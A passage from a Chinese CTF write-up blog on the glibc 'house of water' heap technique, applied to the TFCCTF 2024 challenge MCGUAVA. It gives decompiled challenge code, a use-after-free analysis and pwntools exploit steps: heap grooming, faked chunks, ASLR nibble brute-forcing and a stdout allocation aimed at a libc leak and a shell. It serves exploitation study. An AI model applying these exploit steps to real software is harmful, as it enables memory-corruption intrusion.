<p>可以看到已经成功将 unsorted_middle 给替换为 fake chunk。<br>接下来就是要让 fake unsorted chunk 的 fd 指针和 bk 指针出现 libc 的地址，当我们申请一个 chunk 的size 小于 0x10000 且无对应 size 的 chunk 在tcache 和其他 bin 中时，会先对 unsroted bin 进行遍历，然后 unsorted_end 和 unsorted_start 送入 smallbin 中，将 fake chunk 送入 largebin 中，此时 fake chunk 的 fd 和 bk 指针指向 libc 的相关地址，此时再在 fake unsorted chunk 中切割出合适大小的堆块进行分配。how2heap 的代码中选择申请的堆块大小为 0x290，其实申请的大小满足我上面所说的条件即可。<br>将断点下到 70 行，此时已经完成了堆块的申请，查看 tcache_perthread_struct 结构体和 bin 的结构：</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/9.png" class="" title="我的图图呢">
<p>已经给踩上 libc 上的地址⬆️</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/10.png" class="" title="我的图图呢">
<p>此时我们可以进行 libc 上内存的分配，这也是 house of water 的所有内容，后续的攻击就看每个人的需求了。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>可以看到 house of water 能够在没有内存泄露的情况下在 tcache 链上留下 libc 的相关地址。在修改 unsorted_start 和 unsroted_end 的指针使 fake unsorted chunk 链入unosorted chunk 的这步中我们需要进行一步小爆破，因为我们每次修改不能只覆盖地址的低3位，而是低4位，在开启了 alsr 的环境下从第 4 位开始的地址都是随机的。<br>我认为 house of water 攻击的关键是伪造并释放那 2 个大小分别为 0x20 和 0x30 的堆块，想了想这个伪造在 pwn 题中并不简单。<br>希望读者能够自己调试一遍 how2heap 里面的代码，相信你们一定会有新的收获。</p>
<h2 id="TFCCTF-2024-MCGUAVA"><a href="#TFCCTF-2024-MCGUAVA" class="headerlink" title="TFCCTF 2024 MCGUAVA"></a>TFCCTF 2024 MCGUAVA</h2><p>这道题目需要用到 house of water，当时好像有 7 解了，可是我还没做出来，太菜了😭😭😭</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/11.png" class="" title="我的图图呢">
<p>当时的想法是让同一个 chunk 同时进入 unsortedbin 和 smallbin 以此来留下 libc 的地址，可是搞了半天什么都没搞出来，不知道有没有师傅是用这种方法做出来的🤔<br>题目可以从 r3kapig 战队的比赛题库中找到：<a target="_blank" rel="noopener" href="https://r3kapig-not1on.notion.site/TFC-CTF-2024-Jeopardy-bc81d99eb2064c8db48faf5bc5af50ee">TFC CTF 2024(Jeopardy) (notion.site)</a><br>这题附件里给的 dockerfile 里写的远程环境为 ubuntu:24.10，我寻思着这不也才 8 月嘛，怎么都有 10 了🤔<br>这里我做了个小偷懒，libc 我用了本地的 2.35，不过大差不差，最终思路还是一样的，也就一个偏移不同而已<br>由于题目代码量比较少，这里就直接贴上来</p>
<h4 id="ida伪代码"><a href="#ida伪代码" class="headerlink" title="ida伪代码"></a>ida伪代码</h4><p>main：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">    guava_gius[i] = <span class="number">0LL</span>;</span><br><span class="line">  banner();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      guava();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      gius();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>guava：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">guava</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( cnt_guavas &gt; <span class="number">255</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;how many guavas: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">1791</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guavset: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v2 - <span class="number">2</span> &lt;= v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guavas: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v4[v3], v2 - v3);</span><br><span class="line">  v0 = cnt_guavas++;</span><br><span class="line">  guava_gius[v0] = v4;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>gius：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">gius</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guava no: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0x100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)guava_gius[v1]);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>这是一个很典型的菜单程序，实现了堆块的申请和释放功能，没有编辑和和打印功能。漏洞十分的明显，就是 gius 在释放堆块后并没有将相应的指针置 0，这里存在 UAF 漏洞。程序最多可以申请 0x100 个堆块，每个堆块最大为 0x1791，这不摆明着让我们使用 house of water 进行攻击嘛？😇<br>这里先贴上我的交互脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;*&gt;&#x27;</span>,timeout = <span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index=<span class="number">0</span>,content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;how many guavas:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavset:&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavas:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guava no:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure>
<p>现在我们的整理思路是利用 house of water 实现 stdout 上的内存分配，然后通过 stdout 泄露出 libc 的地址，最后通过伪造 io file 来 getshell。<br>既然上面说到 house of water 的关键是伪造 unsorted_start 和 unsroted_end 上方的2个小堆块，这里就先进行这一步，已经 unsorted_start 为例</p>
<h4 id="获取堆块索引"><a href="#获取堆块索引" class="headerlink" title="获取堆块索引"></a>获取堆块索引</h4><p>因为我们的小 fake chunk 和 unsorted_start 最终都是要给 free 掉的，所以我们要先获得他的索引，这里我使用的是堆块切割法，通过让一个巨大的堆块进入 unsorted bin，然后按照一定的大小申请 2 个堆块出来获取索引，然后再将申请出来的堆块释放掉，使其再次和合并进入 unsorted bin，相关代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 8 fake 0x30</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 10 </span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 12 unsorted_start</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x31</span>)) <span class="comment"># 13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 14</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 15 unsorted_start</span></span><br><span class="line">add(<span class="number">0x6e0</span>) <span class="comment"># 16</span></span><br></pre></td></tr></table></figure>
<p>这里我一共申请了 4 个大堆块，其中第 4 个堆块是用于防止 unsorted bin 与 top chunk 进行合并。可能有人会问为什么我要申请这么大的堆块来防止合并，其实我是为了减少对 tcache 的影响，因为 house of water 后的攻击将会在 tcache_perthread_struct 中进行，所以我尽可能的让更少的 chunk 进入 tcache。这里进行了 fake 0x30 和 unsorted_start 2 个堆块索引的获取，并将 fake 0x30 释放掉进入 tcache<br>这里我们将上面代码进行修改如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 8 fake 0x30</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 10 </span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 12 unsorted_start</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x31</span>)) <span class="comment"># 13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 14</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 15 unsorted_start</span></span><br><span class="line">add(<span class="number">0x6e0</span>) <span class="comment"># 16</span></span><br><span class="line">free(<span class="number">15</span>) <span class="comment"># free unsorted_start</span></span><br></pre></td></tr></table></figure>
<p>这里释放了我们 unsorted_start，此时 bin 的结构如下：</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/12.png" class="" title="我的图图呢">
<p>可以看到 0x30 的 tcache 和 unsorted bin 指向的是同一块区域，说明我们伪造成功<br>对于 unsorted_end 上方 fake chunk 的伪造原理相同，只不过这里的 fake chunk 大小为 0x20，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 17</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 18 fake 0x20</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 19</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 20</span></span><br><span class="line">free(<span class="number">17</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 21</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 22 unsorted_end</span></span><br><span class="line">free(<span class="number">21</span>)</span><br><span class="line">free(<span class="number">22</span>)</span><br><span class="line">add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x21</span>)) <span class="comment"># 23</span></span><br><span class="line">free(<span class="number">23</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 24</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 25 unsorted_end</span></span><br><span class="line">add(<span class="number">0x6e0</span>) <span class="comment"># 26</span></span><br></pre></td></tr></table></figure>
<p>接下来需要获取 unsorted_middle 这个堆块的索引，因为这个堆块不需要在上方伪造 fake chunk，所以索引比较容易获得，直接申请即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 27 unsorted_middle</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 28</span></span><br></pre></td></tr></table></figure>
<p>第二个堆块同样是为了防止合并<br>后面依然进行简单的操作，在 tcache_perthread_struct 上进行 fake unsorted chunk 的伪造，这部也比较简单，已经成为模板化的东西了，申请 2 个 size 分别为 0x3f0 和 0x3e0 的堆块然后直接释放掉即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x3e8</span>) <span class="comment"># 29</span></span><br><span class="line">add(<span class="number">0x3d8</span>) <span class="comment"># 30</span></span><br><span class="line">free(<span class="number">29</span>)</span><br><span class="line">free(<span class="number">30</span>)</span><br></pre></td></tr></table></figure>
<p>效果如下：</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/13.png" class="" title="我的图图呢">
<h4 id="获取能够修改-unsorted-start-和-unsorted-end-的堆块"><a href="#获取能够修改-unsorted-start-和-unsorted-end-的堆块" class="headerlink" title="获取能够修改 unsorted_start 和 unsorted_end 的堆块"></a>获取能够修改 unsorted_start 和 unsorted_end 的堆块</h4><p>这一步主要是因为程序没有编辑功能，当我们将 unsorted_end、unsorted_middle、unsorted_start 释放进 unsorted bin 时我们就无法修改 unsorted_start 和 unsorted_end 的指针。<br>这里我还是使用堆块切割是思想，相关代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x30 和 unsorted_start</span></span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment"># 31</span></span><br><span class="line">add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 32</span></span><br><span class="line">add(<span class="number">0x330</span>) <span class="comment"># 33 change unsorted_start</span></span><br><span class="line">free(<span class="number">33</span>)</span><br><span class="line">add(<span class="number">0x1e0</span>) <span class="comment"># 34</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取一个 tcache 的索引，该 tcache 能够修改 fake 0x20 和 unsorted_end</span></span><br><span class="line">free(<span class="number">24</span>)</span><br><span class="line">free(<span class="number">25</span>)</span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment"># 35</span></span><br><span class="line">add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 36</span></span><br><span class="line">add(<span class="number">0x340</span>) <span class="comment"># 37 change unsorted_end</span></span><br><span class="line">free(<span class="number">37</span>)</span><br><span class="line">add(<span class="number">0x1d0</span>) <span class="comment"># 38</span></span><br></pre></td></tr></table></figure>
<p>这里用于修改 unsorted_start 和 unsorted_end 的堆块我选择的大小为 0x340 和 0x350，因为这个 2 个大小的堆块个释放后是直接进入 tcache，对后面 unsorted bin 中存储的 unsorted_end、unsorted_middle、unsorted_start 影响比较小<br>但由于这个操作改变了原来 unsorted_end、unsorted_start 的 size位</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/14.png" class="" title="我的图图呢">
<p>所以我们需要用我们刚获取的 tcache 堆块来对 unsorted_end、unsorted_start 的 size 位进行恢复</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x330</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 39</span></span><br><span class="line">free(<span class="number">39</span>) </span><br><span class="line">add(<span class="number">0x340</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 40</span></span><br><span class="line">free(<span class="number">40</span>)</span><br></pre></td></tr></table></figure>
<h4 id="伪造-fake-unsorted-chunk-的prev-size-和-size"><a href="#伪造-fake-unsorted-chunk-的prev-size-和-size" class="headerlink" title="伪造 fake unsorted chunk 的prev_size 和 size"></a>伪造 fake unsorted chunk 的prev_size 和 size</h4><p>因为我们的 fake unsorted chunk 最终进入到 unsorted bin 中，unsorted bin 会检测这个堆块的合法性，会检测 fake unosrted chunk 的 next chunk 的prev_size 和 size，伪造代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x210</span>) <span class="comment"># 76</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(<span class="number">0x10000</span>)+p64(<span class="number">0x20</span>)) <span class="comment"># 77</span></span><br></pre></td></tr></table></figure>
<p>注意这里 next chunk 的 issue 位要为 0，因为 unsorted bin 上的堆块都是没有给使用的<br>接下来就是愉快的一条龙服务，依次释放 unsorted_end、unsorted_middle、unsorted_start 进入 unsorted bin，然后分别修改 unsorted_start 和 unsorted_end 的 fd 和 bk 指针将 fake unsorted chunk 链入 unsorted bin 中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x238</span>) <span class="comment">#78</span></span><br><span class="line">add(<span class="number">0x248</span>) <span class="comment">#79</span></span><br><span class="line">free(<span class="number">78</span>)</span><br><span class="line">free(<span class="number">79</span>)</span><br><span class="line"><span class="comment"># 依次释放 unsorted_end、unsorted_middle、unsorted_start</span></span><br><span class="line">free(<span class="number">25</span>)</span><br><span class="line">free(<span class="number">27</span>)</span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 令 unsorted_start 的 fd 指针和 unsorted_end 的 bk 指针指向 fake unsorted chunk</span></span><br><span class="line">add(<span class="number">0x330</span>,<span class="number">0x20</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 80</span></span><br><span class="line">free(<span class="number">80</span>)</span><br><span class="line">add(<span class="number">0x340</span>,<span class="number">0x28</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 81</span></span><br><span class="line">free(<span class="number">81</span>)</span><br></pre></td></tr></table></figure>
<p>这里我提前申请了 2 个 chunk，大小分别为 0x240 和 0x250，这 2 个堆块在后续的攻击中会用到。在修改 fd 和 bk指针中我们需要爆破地址的第 4 位，概率为 1&#x2F;16，我这里选择爆破的是 heapbase 的第 4 位为 0，成功后的效果如下：</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/15.png" class="" title="我的图图呢">
<p>可以看到 fake unsorted chunk 已经进入到 unsorted bin 中，现在我们来梳理一下目前的状况：<br>目前 unsorted bin 中有 3 个堆块，两侧的 unsorted_end、unsorted_start 大小为 0x510，中间的 fake unsorted chunk 的大小为 0x10001，两侧的堆块十分的碍事，所以我们将其申请出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br></pre></td></tr></table></figure>
<p>此时 fake unsorted chunk 已经进入到 largebin 中，并在 tcache 上踩下 libc 的地址</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/16.png" class="" title="我的图图呢">
<p>现在我们的思路就非常的明确了，我的做法是先申请一个 0x110 大小的堆块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>))</span><br></pre></td></tr></table></figure>
<p>此时 largebin 的 fd 指针所在的位置正好是 tcache_perthread_struct 上 0x240 大小 tcache 最后一个 chunk 的存储地址，此时已经给踩上了 libc 的地址</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/17.png" class="" title="我的图图呢">
<p>然后再将该地址申请出来，将地址的低 3 位改为 stdout 地址的低 3 位，爆破第 4 位，用 tcache 分配堆块到 stdout 上进而泄露出 libc 的地址，这里的爆破成功率也为 1&#x2F;16</p>
